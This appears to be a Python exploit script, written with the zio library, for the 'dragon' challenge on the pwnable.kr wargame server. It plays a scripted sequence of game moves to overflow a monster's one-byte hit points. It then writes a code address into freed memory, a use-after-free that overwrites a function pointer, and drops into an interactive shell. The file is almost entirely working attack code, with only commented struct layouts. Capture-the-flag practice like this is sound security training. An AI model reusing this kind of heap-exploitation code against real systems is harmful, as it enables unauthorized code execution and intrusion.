from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './dragon'
target  = ('pwnable.kr', 9004)

io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
#io.gdb_hint([0x08048d78])

# struct monster {
#     int     *print_func(struct monster *)
#     int     type ; 1 mom, 0 baby
#     char    hp;
#     char    heals;
#     int     deals;
# }
# 
# struct hero {
#     int     type ; 1 priest, 2 knight
#     int     hp;
#     int     mp;
#     int     *print_func(struct hero *)
# }

io.writeline('1')
io.writeline('1')
io.writeline('1')
io.writeline('1')

io.writeline('3')
io.writeline('3')
io.writeline('2')
io.writeline('3')
io.writeline('3')
io.writeline('2')
io.writeline('3')
io.writeline('3')
io.writeline('2')
io.writeline('3')
io.writeline('3')
io.writeline('2')

io.writeline(l32(0x08048dbf))

io.interact()
